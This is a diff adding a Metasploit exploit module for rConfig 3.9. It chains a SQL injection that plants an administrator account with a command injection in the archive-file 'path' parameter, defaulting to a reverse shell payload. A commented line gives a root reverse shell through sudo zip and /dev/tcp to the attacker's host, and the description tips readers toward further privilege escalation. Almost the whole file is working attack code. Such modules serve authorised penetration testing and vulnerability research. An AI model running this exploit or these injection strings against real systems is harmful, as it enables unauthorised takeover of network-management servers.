@@ -1,0 +1,201 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GoodRanking
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name' => 'Rconfig 3.x Chained Remote Code Execution',
+                      'Description' => '
+        This module exploits multiple vulnerabilities in rConfig version 3.9
+        in order to execute arbitrary commands.
+        This module takes advantage of a command injection vulnerability in the
+        `path` parameter of the ajax archive file functionality within the rConfig web
+        interface in order to execute the payload.
+        Valid credentials for a user with administrative privileges are required.
+        However, this module can bypass authentication via SQLI.
+        This module has been successfully tested on Rconfig 3.9.3 and 3.9.4.
+        The steps are:
+          1. SQLi on /commands.inc.php allows us to add an administrative user.
+          2. An authenticated session is established with the newly added user
+          3. Command Injection on /lib/ajaxHandlers/ajaxArchiveFiles.php allows us to
+             execute the payload.
+          4. Remove the added admin user.
+        Tips : once you get a shell, look at the CVE-2019-19585.
+        You will probably get root because rConfig install script add Apache user to
+        sudoers with nopasswd ;-)
+      ',
+                      'License'         => MSF_LICENSE,
+                      'Author'          =>
+        [
+          'Jean-Pascal Thomas', # @vikingfr - Discovery, exploit and Metasploit module
+          'Orange Cyberdefense' # Module tests - greetz : CSR-SO team (https://cyberdefense.orange.com/)
+        ],
+                      'References'      =>
+        [
+          ['CVE', '2019-19509'], # authenticated rce
+          ['CVE', '2020-10220'], # sqli auth bypass
+          %w[EDB 47982],
+          %w[EDB 48208],
+          ['URL', 'https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2019-19509.py'], # authenticated RCE
+          ['URL', 'https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py']  # unauthenticated SQLi
+        ],
+                      'Platform'        => %w[unix linux],
+                      'Arch'            => ARCH_CMD,
+                      'Targets'         => [['Auto', {}]],
+                      'Privileged'      => false,
+                      'DisclosureDate'  => '2020-03-11',
+                      'DefaultOptions'  => {
+                        'RPORT' => 443,
+                        'SSL'     => true, # HTTPS is required for the module to work because the rConfig php code handle http to https redirects
+                        'PAYLOAD' => 'generic/shell_reverse_tcp'
+                      },
+                      'DefaultTarget' => 0))
+    register_options [
+      OptString.new('TARGETURI', [true, 'Base path to Rconfig', '/'])
+    ]
+  end
+
+  # CHECK IF RCONFIG IS REACHABLE AND INSTALLED
+  def check
+    vprint_status 'STEP 0: Get rConfig version...'
+    res = send_request_cgi!(
+      'method' => 'GET',
+      'uri' => '/login.php'
+    )
+    if !res || !res.get_html_document
+      fail_with(Failure::Unknown, 'Could not check rConfig version')
+    end
+    if res.get_html_document.at('div[@id="footer-copyright"]').text.include? 'rConfig Version 3.9'
+      print_good('rConfig version 3.9 detected')
+      return Exploit::CheckCode::Appears
+    elsif res.get_html_document.at('div[@id="footer-copyright"]').text.include? 'rConfig'
+      print_status('rConfig detected, but not version 3.9')
+      return Exploit::CheckCode::Detected
+    end
+  end
+
+  # CREATE AN ADMIN USER IN RCONFIG
+  def create_rconfig_user(user, _password)
+    vprint_status 'STEP 1 : Adding a temporary admin user...'
+    fake_id = Rex::Text.rand_text_numeric(3)
+    fake_pass = Rex::Text.rand_text_alpha(10)
+    fake_pass_md5 = '21232f297a57a5a743894a0e4a801fc3' # hash of 'admin'
+    fake_userid_md5 = '6c97424dc92f14ae78f8cc13cd08308d'
+    userleveladmin = 9 # Administrator
+    user_sqli = "command ; INSERT INTO `users` (`id`,`username`,`password`,`userid`,`userlevel`,`email`,`timestamp`,`status`) VALUES (#{fake_id},'#{user}','#{fake_pass_md5}','#{fake_userid_md5}',#{userleveladmin}, '#{user}@domain.com', 1346920339, 1);--"
+    sqli_res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, '/commands.inc.php'),
+      'method' => 'GET',
+      'vars_get' => {
+        'search' => 'search',
+        'searchOption' => 'contains',
+        'searchField'  => 'vuln',
+        'searchColumn' => user_sqli
+      }
+    )
+    unless sqli_res
+      print_warning('Failed to create user: Connection failed.')
+      return
+    end
+    print_good "New temporary user #{user} created"
+  end
+
+  # AUTHENTICATE ON RCONFIG
+  def login(user, pass)
+    vprint_status "STEP 2: Authenticating as #{user} ..."
+    # get session cookie (PHPSESSID)
+    res = send_request_cgi!(
+      'method' => 'GET',
+      'uri' => '/login.php'
+    )
+    @cookie = res.get_cookies
+    if @cookie.empty?
+      fail_with Failure::UnexpectedReply, 'Failed to retrieve cookies'
+      return
+    end
+    # authenticate
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, '/lib/crud/userprocess.php'),
+      'cookie' => @cookie,
+      'vars_post' => {
+        pass: pass,
+        user: user,
+        sublogin: 1
+      }
+    )
+    unless res
+      print_warning('Failed to authenticate: Connection failed.')
+      return
+    end
+    print_good "Authenticated as user #{user}"
+  end
+
+  def trigger_rce(cmd, _opts = {})
+    vprint_status "STEP 3: Executing the command (#{cmd})"
+    trigger = "`#{cmd} #`"
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, '/lib/ajaxHandlers/ajaxArchiveFiles.php'),
+      'cookie' => @cookie,
+      'vars_get' => {
+        'path' => trigger,
+        'ext' => 'random'
+      }
+    )
+    # the page hangs because of the command being executed, so we can't expect HTTP response
+    # unless res
+    #  fail_with Failure::Unreachable, 'Remote Code Execution failed: Connection failed'
+    #  return
+    # end
+    # unless res.body.include? '"success":true'
+    #  fail_with Failure::Unknown, 'It seems that the code was not executed'
+    #  return
+    # end
+    print_good 'Command sucessfully executed'
+  end
+
+  # DELETE A USER
+  def delete_rconfig_user(user)
+    vprint_status 'STEP 4 : Removing the temporary admin user...'
+    del_sqli = "command ; DELETE FROM `users` WHERE `username`='#{user}';--"
+    del_res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, '/commands.inc.php'),
+      'method' => 'GET',
+      'vars_get' => {
+        'search' => 'search',
+        'searchOption' => 'contains',
+        'searchField'  => 'vuln',
+        'searchColumn' => del_sqli
+      }
+    )
+    unless del_res
+      print_warning "Removing user #{user} failed: Connection failed. Please remove it manually."
+      return
+    end
+    print_status "User #{user} removed successfully !"
+  end
+
+  def cleanup
+    super
+    delete_rconfig_user @username if @username
+  end
+
+  def exploit
+    check
+    @username = rand_text_alphanumeric(8..12)
+    @password = 'admin'
+    create_res = create_rconfig_user @username, @password
+    login(@username, @password)
+    tmp_txt_file = Rex::Text.rand_text_alpha(10)
+    tmp_zip_file = Rex::Text.rand_text_alpha(10)
+    # The following payload (cf. 2019-19585) can be used to get root rev shell, but some payloads failed to execute (ex : because of quotes stuffs). Too bad :-(
+    # trigger_rce("touch /tmp/#{tmp_txt_file}.txt;sudo zip -q /tmp/#{tmp_zip_file}.zip /tmp/#{tmp_txt_file}.txt -T -TT '/bin/sh -i>& /dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1 #'")
+    trigger_rce(payload.encoded.to_s)
+  end
+end
